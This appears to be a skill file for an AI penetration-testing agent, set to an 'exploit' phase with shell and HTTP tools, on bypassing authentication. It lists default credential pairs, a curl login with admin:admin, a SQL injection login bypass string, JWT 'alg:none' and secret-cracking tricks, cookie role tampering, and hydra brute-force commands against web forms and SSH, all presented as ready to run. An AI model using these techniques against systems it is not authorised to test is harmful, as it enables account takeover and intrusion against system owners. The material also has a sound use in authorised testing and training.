---
name: auth-bypass-default-creds
when: a login form, Basic/Digest auth (401), or an admin panel
tools: [http_request, shell]
phase: exploit
---
# Auth bypass & default credentials

TRY THIS EARLY - it is the cheapest path.
- Default/weak creds: admin:admin, admin:password, admin:123456, admin:admin123, root:root,
  root:toor, admin:(blank), tomcat:tomcat, and product defaults (look up the fingerprinted device/app).
  `curl -u admin:admin http://TARGET/` or an Authorization header.
- Product-specific defaults: routers/cameras/IoT often ship known creds - fingerprint the exact model
  (see `known-cve-exploitation`) and look them up.
- Logic bypasses: SQLi in the login (`admin'-- -`, see `sqli`); response/JWT tampering
  (`alg:none`, weak HMAC secret - crack with `john`/hashcat); forced browsing to the post-login page;
  cookie/role tampering (`isAdmin=true`, `role=admin`).
- Brute force (only when few users / a hint exists):
  `hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"`
  `hydra -L users.txt -P rockyou.txt ssh://TARGET`  (also ftp, http-get for Basic auth)
